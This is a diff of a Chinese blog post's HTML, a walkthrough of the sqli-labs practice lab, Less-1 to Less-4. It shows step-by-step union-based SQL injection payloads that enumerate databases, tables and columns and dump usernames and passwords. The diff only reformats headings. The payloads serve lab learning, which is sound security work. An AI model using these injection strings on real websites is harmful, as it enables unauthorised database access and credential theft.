@@ -470,28 +470,28 @@ SQL 注入（SQL Injection） 是发生在 Web 程序中数据库层的安全漏
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <hr>
-<h1 id="什么是sql-labs？"><a href="#什么是sql-labs？" class="headerlink" title="什么是sql-labs？"></a>什么是sql-labs？</h1><blockquote>
+<h2 id="什么是sql-labs？"><a href="#什么是sql-labs？" class="headerlink" title="什么是sql-labs？"></a>什么是sql-labs？</h2><blockquote>
 <p>SQL 注入（SQL Injection） 是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。 主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息<br>推荐一个视频<a target="_blank" rel="noopener" href="https://b23.tv/UY1Cx5T">【转载】SQL注入、SSTI&amp;Docker逃逸 HTB CTF -GoodGame-哔哩哔哩</a></p>
 </blockquote>
-<h1 id="Less-1，2"><a href="#Less-1，2" class="headerlink" title="Less-1，2"></a>Less-1，2</h1><p>这两个知识点，都没差…<br>网上查询得Pass-01基于单引号的SQL注入，Pass-02基于整数的注入</p>
-<h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>用get传值id&#x3D;1，随后能看到网页出现变化<br><img src="https://img-blog.csdnimg.cn/c0be8cab3d894317a423ebf5fed7be66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">用get传值id&#x3D;2，<br><img src="https://img-blog.csdnimg.cn/6b302c32bbe249ab8090f4f16d346e5c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用get传值id&#x3D;15之后，界面异常。<br><img src="https://img-blog.csdnimg.cn/87cc97841d6f40138d971a516c458367.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>有没有可能把?id&#x3D;1,这个传参给它拼接到SQL语句中？并且被当做SQL代码进行执行？<br>尝试，?id&#x3D;1 and 1&#x3D;2…无变化。<br><img src="https://img-blog.csdnimg.cn/7e66849c9be04157a6bea7f1d092cf7c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>Pass-02的知识从这开始</strong>，尝试闭合?id&#x3D;1’and 1&#x3D;1– za（后跟的字母随便…）<br><img src="https://img-blog.csdnimg.cn/909b90f69cf948e0bdfc68ea9427394d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>注意空格（格式），否则会报错，如图<br><img src="https://img-blog.csdnimg.cn/d342f1426f7e4609b23a73dfb0e5505d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>?id&#x3D;1’and 1&#x3D;2– zaa，页面异常（可能存在SQL注入）<br><img src="https://img-blog.csdnimg.cn/ac819ee9153a4103b10c547a369f7d59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p>使用 order by 查询所有字段，从1开始直到4，发现3正常，但是4的页面异常（存在三个字段）<br><img src="https://img-blog.csdnimg.cn/cb700a391e0a4a9490bd13c751ef9270.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h2 id="union-select判断显错位（回显）"><a href="#union-select判断显错位（回显）" class="headerlink" title="union select判断显错位（回显）"></a>union select判断显错位（回显）</h2><p>输入，?id&#x3D;1’union select 1,2,3– zaa，显示了前面的结果，<br>1,2,3:仅仅相当于占了三个位置（先前order by 查询为3），所以用什么表示均可。<br><img src="https://img-blog.csdnimg.cn/01f6df7124c54dcd8419d1481ed7e103.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>从而试着将id&#x3D;1,改为id&#x3D;15(因为页面没结果)<br><img src="https://img-blog.csdnimg.cn/3aa9395838fc4775982dc299ac8594ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>注意：有文章说，已知这里面只有三列，找每一列的位置，使用  ?id&#x3D;0’ union select 1,2,3 –+  （要注意的是此处的id值必须是0以下的数字，否则不能成功）</strong></p>
-<h2 id="库名和登录用户名"><a href="#库名和登录用户名" class="headerlink" title="库名和登录用户名"></a>库名和登录用户名</h2><p>将2的位置换为**database()**，显示当前页面数据库库名：security。<br><img src="https://img-blog.csdnimg.cn/74dddb310ea249d08af03d7d6c5103e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查询当前数据库的库名和当前的登录用户名，使用  ?id&#x3D;0’ union select 1,database(),user() – zaa<br>user()顶替3的位置，为当前的登录用户名。<br><img src="https://img-blog.csdnimg.cn/3898503fecb0432496795b1c730509b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h2 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h2><p><strong>?id&#x3D;15’union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’– zaa</strong><br>  table_name：代表表名<br> –<br> information_schema藏有自带的数据库<br>  table_schema字面指库名<br><img src="https://img-blog.csdnimg.cn/58955874ff67410ab44170134c3f9def.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>第二位（则第一位可用limit 0,1表示）</strong><br>?id&#x3D;15’union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’ <strong>limit 1,1</strong>– zaa<br><img src="https://img-blog.csdnimg.cn/11562a9f3c9c4d17bed2417ccfd0dd93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>第三位（limit 1,1中的前面的1改为2）</strong><br>即…?id&#x3D;15’union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’ limit 2,1– zaa<br><img src="https://img-blog.csdnimg.cn/92f2deb6361f437b8dfb76f7299c425a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>等…</p>
-<h2 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h2><p>?id&#x3D;15’union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’emails’– zaa<br><strong>emails：可根据表进行替换</strong><br><img src="https://img-blog.csdnimg.cn/1e957ff1501a4e3cb5ad468e02c95fc0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>例：<br>?id&#x3D;15’union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’referers’– zaa<br><img src="https://img-blog.csdnimg.cn/207f8cece1464c7e8e6922607c3d7709.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h2 id="判断数据"><a href="#判断数据" class="headerlink" title="判断数据"></a>判断数据</h2><p>?id&#x3D;15’union select 1,id,3 from emails– zaa<br><img src="https://img-blog.csdnimg.cn/d737aeeace354ac5b88f44b6c6ebee46.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>与上同，<strong>emails：可根据表进行替换</strong></p>
-<h2 id="快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）"><a href="#快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）" class="headerlink" title="快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）"></a>快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）</h2><p>将2的位置换为**database()**，显库名：security。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/x647498949/article/details/122628708?ops_request_misc=&request_id=&biz_id=102&utm_term=sqli%E7%AC%AC%E4%B8%80%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-122628708.nonecase&spm=1018.2226.3001.4187">参考文章…</a></p>
-<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><p>数据库库名后再爆破数据库，使用  ?id&#x3D;0’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),3 –+<br><img src="https://img-blog.csdnimg.cn/7791b331f93149b2870209c872da7dc3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>表名一步到位…</p>
-<h3 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h3><p>?id&#x3D;0’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and  table_name&#x3D;’<strong>emails</strong>‘),3 –+<br><strong>emails：可根据表进行替换</strong><br><img src="https://img-blog.csdnimg.cn/7a2a6bf46a5a483196e1432e99b9b5a3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h3 id="数据名"><a href="#数据名" class="headerlink" title="数据名"></a>数据名</h3><p>格式?id&#x3D;0’ union select 1,(select group_concat(concat_ws(0x7e,表名对应的列名,表名对应的列名)) from 表名),3 –+<br>0x7e应该是个站位的…，其位置也可为表名对应的列名，观察02，03</p>
-<h4 id="01"><a href="#01" class="headerlink" title="01"></a>01</h4><p>?id&#x3D;0’ union select 1,(select group_concat(concat_ws(0x7e,id,email_id)) from emails),3 –+ 进行爆破，得到以下内容。<br><img src="https://img-blog.csdnimg.cn/94c97e83fce94c4096270149abcbe811.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h4 id="02"><a href="#02" class="headerlink" title="02"></a>02</h4><p> ?id&#x3D;0’ union select 1,(select group_concat(concat_ws(<strong>0x7e</strong>,username,password)) from users),3 –+  进行爆破，得到以下内容。<br><img src="https://img-blog.csdnimg.cn/25d6fbb527544c77b4c58a2a78484379.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h4 id="03"><a href="#03" class="headerlink" title="03"></a>03</h4><p>?id&#x3D;0’ union select 1,(select group_concat(concat_ws(<strong>id</strong>,username,password)) from users),3 –+  进行爆破，得到以下内容<br><img src="https://img-blog.csdnimg.cn/45be3f4169154987bd685c988a57bffb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>查看源码…发现被框了。不会被当做代码，从而使代码失效。<img src="https://img-blog.csdnimg.cn/fe92e2ded3c5470abc0a76d92073df24.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>从而01 02的代码’后加一个 ) 即可。</p>
+<h2 id="Less-1，2"><a href="#Less-1，2" class="headerlink" title="Less-1，2"></a>Less-1，2</h2><p>这两个知识点，都没差…<br>网上查询得Pass-01基于单引号的SQL注入，Pass-02基于整数的注入</p>
+<h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p>用get传值id&#x3D;1，随后能看到网页出现变化<br><img src="https://img-blog.csdnimg.cn/c0be8cab3d894317a423ebf5fed7be66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">用get传值id&#x3D;2，<br><img src="https://img-blog.csdnimg.cn/6b302c32bbe249ab8090f4f16d346e5c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用get传值id&#x3D;15之后，界面异常。<br><img src="https://img-blog.csdnimg.cn/87cc97841d6f40138d971a516c458367.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>有没有可能把?id&#x3D;1,这个传参给它拼接到SQL语句中？并且被当做SQL代码进行执行？<br>尝试，?id&#x3D;1 and 1&#x3D;2…无变化。<br><img src="https://img-blog.csdnimg.cn/7e66849c9be04157a6bea7f1d092cf7c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>Pass-02的知识从这开始</strong>，尝试闭合?id&#x3D;1’and 1&#x3D;1– za（后跟的字母随便…）<br><img src="https://img-blog.csdnimg.cn/909b90f69cf948e0bdfc68ea9427394d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>注意空格（格式），否则会报错，如图<br><img src="https://img-blog.csdnimg.cn/d342f1426f7e4609b23a73dfb0e5505d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>?id&#x3D;1’and 1&#x3D;2– zaa，页面异常（可能存在SQL注入）<br><img src="https://img-blog.csdnimg.cn/ac819ee9153a4103b10c547a369f7d59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>使用 order by 查询所有字段，从1开始直到4，发现3正常，但是4的页面异常（存在三个字段）<br><img src="https://img-blog.csdnimg.cn/cb700a391e0a4a9490bd13c751ef9270.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="union-select判断显错位（回显）"><a href="#union-select判断显错位（回显）" class="headerlink" title="union select判断显错位（回显）"></a>union select判断显错位（回显）</h3><p>输入，?id&#x3D;1’union select 1,2,3– zaa，显示了前面的结果，<br>1,2,3:仅仅相当于占了三个位置（先前order by 查询为3），所以用什么表示均可。<br><img src="https://img-blog.csdnimg.cn/01f6df7124c54dcd8419d1481ed7e103.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>从而试着将id&#x3D;1,改为id&#x3D;15(因为页面没结果)<br><img src="https://img-blog.csdnimg.cn/3aa9395838fc4775982dc299ac8594ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>注意：有文章说，已知这里面只有三列，找每一列的位置，使用  ?id&#x3D;0’ union select 1,2,3 –+  （要注意的是此处的id值必须是0以下的数字，否则不能成功）</strong></p>
+<h3 id="库名和登录用户名"><a href="#库名和登录用户名" class="headerlink" title="库名和登录用户名"></a>库名和登录用户名</h3><p>将2的位置换为**database()**，显示当前页面数据库库名：security。<br><img src="https://img-blog.csdnimg.cn/74dddb310ea249d08af03d7d6c5103e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查询当前数据库的库名和当前的登录用户名，使用  ?id&#x3D;0’ union select 1,database(),user() – zaa<br>user()顶替3的位置，为当前的登录用户名。<br><img src="https://img-blog.csdnimg.cn/3898503fecb0432496795b1c730509b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><p><strong>?id&#x3D;15’union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’– zaa</strong><br>  table_name：代表表名<br> –<br> information_schema藏有自带的数据库<br>  table_schema字面指库名<br><img src="https://img-blog.csdnimg.cn/58955874ff67410ab44170134c3f9def.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>第二位（则第一位可用limit 0,1表示）</strong><br>?id&#x3D;15’union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’ <strong>limit 1,1</strong>– zaa<br><img src="https://img-blog.csdnimg.cn/11562a9f3c9c4d17bed2417ccfd0dd93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>第三位（limit 1,1中的前面的1改为2）</strong><br>即…?id&#x3D;15’union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’ limit 2,1– zaa<br><img src="https://img-blog.csdnimg.cn/92f2deb6361f437b8dfb76f7299c425a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>等…</p>
+<h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><p>?id&#x3D;15’union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’emails’– zaa<br><strong>emails：可根据表进行替换</strong><br><img src="https://img-blog.csdnimg.cn/1e957ff1501a4e3cb5ad468e02c95fc0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>例：<br>?id&#x3D;15’union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’referers’– zaa<br><img src="https://img-blog.csdnimg.cn/207f8cece1464c7e8e6922607c3d7709.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="判断数据"><a href="#判断数据" class="headerlink" title="判断数据"></a>判断数据</h3><p>?id&#x3D;15’union select 1,id,3 from emails– zaa<br><img src="https://img-blog.csdnimg.cn/d737aeeace354ac5b88f44b6c6ebee46.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>与上同，<strong>emails：可根据表进行替换</strong></p>
+<h3 id="快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）"><a href="#快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）" class="headerlink" title="快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）"></a>快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）</h3><p>将2的位置换为**database()**，显库名：security。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/x647498949/article/details/122628708?ops_request_misc=&request_id=&biz_id=102&utm_term=sqli%E7%AC%AC%E4%B8%80%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-122628708.nonecase&spm=1018.2226.3001.4187">参考文章…</a></p>
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>数据库库名后再爆破数据库，使用  ?id&#x3D;0’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),3 –+<br><img src="https://img-blog.csdnimg.cn/7791b331f93149b2870209c872da7dc3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>表名一步到位…</p>
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p>?id&#x3D;0’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and  table_name&#x3D;’<strong>emails</strong>‘),3 –+<br><strong>emails：可根据表进行替换</strong><br><img src="https://img-blog.csdnimg.cn/7a2a6bf46a5a483196e1432e99b9b5a3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h4 id="数据名"><a href="#数据名" class="headerlink" title="数据名"></a>数据名</h4><p>格式?id&#x3D;0’ union select 1,(select group_concat(concat_ws(0x7e,表名对应的列名,表名对应的列名)) from 表名),3 –+<br>0x7e应该是个站位的…，其位置也可为表名对应的列名，观察02，03</p>
+<h5 id="01"><a href="#01" class="headerlink" title="01"></a>01</h5><p>?id&#x3D;0’ union select 1,(select group_concat(concat_ws(0x7e,id,email_id)) from emails),3 –+ 进行爆破，得到以下内容。<br><img src="https://img-blog.csdnimg.cn/94c97e83fce94c4096270149abcbe811.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h5 id="02"><a href="#02" class="headerlink" title="02"></a>02</h5><p> ?id&#x3D;0’ union select 1,(select group_concat(concat_ws(<strong>0x7e</strong>,username,password)) from users),3 –+  进行爆破，得到以下内容。<br><img src="https://img-blog.csdnimg.cn/25d6fbb527544c77b4c58a2a78484379.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h5 id="03"><a href="#03" class="headerlink" title="03"></a>03</h5><p>?id&#x3D;0’ union select 1,(select group_concat(concat_ws(<strong>id</strong>,username,password)) from users),3 –+  进行爆破，得到以下内容<br><img src="https://img-blog.csdnimg.cn/45be3f4169154987bd685c988a57bffb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>查看源码…发现被框了。不会被当做代码，从而使代码失效。<img src="https://img-blog.csdnimg.cn/fe92e2ded3c5470abc0a76d92073df24.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>从而01 02的代码’后加一个 ) 即可。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断是否存在注入：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)and 1=1-- za</span></span><br><span class="line"><span class="string">判断字段数：?id=1&#x27;</span>)<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="comment">-- za </span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span>判断显错位  ： ?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)union select 1,2,3-- zaa  </span></span><br><span class="line"><span class="string">判断表名：?id=15&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">-- zaa  </span></span><br><span class="line">判断列名：?id<span class="operator">=</span><span class="number">15</span><span class="string">&#x27;)union select 1,column_name,3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27;-- zaa  </span></span><br><span class="line"><span class="string">判断数据名：?id=15&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,id,<span class="number">3</span> <span class="keyword">from</span> emails<span class="comment">-- zaa  </span></span><br></pre></td></tr></table></figure>
 
-<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>由图与03相比单引变成了双引号…<br><img src="https://img-blog.csdnimg.cn/d8068ae6f3bb4a4c89a036a0d67b0a72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断是否存在注入：?id<span class="operator">=</span><span class="number">1</span>&quot;)and 1=1-- za  </span><br><span class="line"> 判断字段数：?id=1&quot;)<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="comment">-- za  </span></span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span>判断显错位    ?id<span class="operator">=</span><span class="number">1</span>&quot;)union select 1,2,3-- zaa  </span><br><span class="line"> 判断表名：?id=15&quot;)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">-- zaa  </span></span><br><span class="line"> 判断列名：?id<span class="operator">=</span><span class="number">15</span>&quot;)union select 1,column_name,3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27;-- zaa  </span><br><span class="line"> 判断数据名：?id=15&quot;)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,id,<span class="number">3</span> <span class="keyword">from</span> emails<span class="comment">-- zaa  </span></span><br></pre></td></tr></table></figure></p>
